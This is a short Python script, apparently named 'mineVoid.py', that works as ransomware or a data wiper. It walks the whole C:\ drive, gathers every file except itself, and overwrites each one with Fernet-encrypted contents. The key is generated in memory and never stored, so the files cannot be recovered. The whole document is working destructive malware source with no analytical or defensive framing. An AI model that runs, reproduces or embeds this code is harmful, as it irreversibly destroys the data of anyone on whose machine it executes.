import os
from cryptography.fernet import Fernet

files = []

#generates the key
key = Fernet.generate_key()

#Finds every file in the C:\ directory    
for root, dir, file in os.walk("C:\\"):
    for thisFile in file:
        if thisFile == "mineVoid.py":
            continue
        filepath = os.path.join(root, thisFile)
        files.append(filepath)

#prints the path for all the files
#print(files)

#open the files and encrypt it
for file in files:
    with open(file, "rb") as thefile:
       contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        